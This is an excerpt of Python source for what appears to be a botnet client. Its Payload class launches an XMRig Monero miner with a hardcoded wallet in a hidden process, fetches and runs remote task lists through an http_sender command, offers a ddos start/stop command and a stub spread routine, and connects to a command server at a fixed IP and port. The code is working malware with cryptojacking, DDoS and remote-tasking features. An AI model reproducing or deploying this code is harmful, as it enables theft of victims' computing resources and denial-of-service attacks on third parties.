...
class Payload():
    ...
    def _init_dev_miner(self):
        ...
        host_port = 80
        api_port = 8889
        user = '4AykfDk8KWaFbBwKT9YCvjGgwVAWiDppt7EJf9yniYfS4NyMNNeQVzN1LDJ55dJbtn2DgCZjaikqdjE5M2wARenULs8jjwj'
        ...
        try:
            ...
            try:
                ...
                if not self.xmrig_path_dev:
                    ...
                    import random
                    params = self.xmrig_path_dev + " --url={url} --user={user} --pass={pass_} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --http-host={host} --http-port={port} --threads={threads}".format(url=url, user=user, host=globals()['public_ip'](), port=api_port, threads=threads,pass_=random.randint(1,2444))
        ...
        if 'run' in args and len(args) == 4:
            ...
            try:
                ...
                try:
                    ...
                    # pull xmrig from server if necessary
                    if not self.xmrig_path:#_dev:
                        log("Pulling miner from server! {}".format(sys.platform))
                        ...
                        # excute xmrig in hidden process
                        import random
                        params = self.xmrig_path + " --url={url} --user={user} --pass={pass_} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads,pass_=random.randint(1,2444))
                        result = self.execute(params)
                        return result
                    else:
    ...
    def spread(self, args=None):
        ...
        try:
            ...
            ###################################################
    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='test')
    def test(self,mode=None):
        try:
            #print(globals())
            if 'test_asdf' not in globals():
                self.load('test_asdf')
            print(globals()['test_asdf'])
            globals()['test_asdf'].run()
            return 'TEST OK'
        except Exception as e:
            log(e)
            return 'TEST BAD'
    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='http_sender [file]')
    def http_sender(self,args=''):
        if not args:
            return 'You must specify input file'
        if 'http_sender' not in globals():
            self.load('http_sender')
        try:
             #log(args)
            pure_tasks=urlopen(args).read().decode('utf-8')
            pure_tasks=json.loads(pure_tasks)
            globals()['http_sender'].run(pure_tasks)
            return 'http sender started!'
        except Exception as e:
            log(e)
            return 'error: {}'.format(e)
    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='ddos command [link]')       
    def ddos(self,args=''):
        if not args:
            return 'unknown command'
        if not 'start' in args.split() and not 'stop' in args.split():
            return 'unknown command'
        if 'ddos' not in globals():
            self.load('ddos')
        try:
            if 'stop' in args.split():
                globals()['ddos'].stop()
            if 'start' in args.split():
                _,link=args.split()
                globals()['ddos'].start(link)
            else:
                return 'cannot start ddos'
            return 'ddos started'
        except Exception as e:
            log(e)
            return 'error: {}'.format(e)
...
if __name__ == '__main__':
    _payload = Payload(host='10.9.111.129', port='5555', pastebin='')
    _payload.run()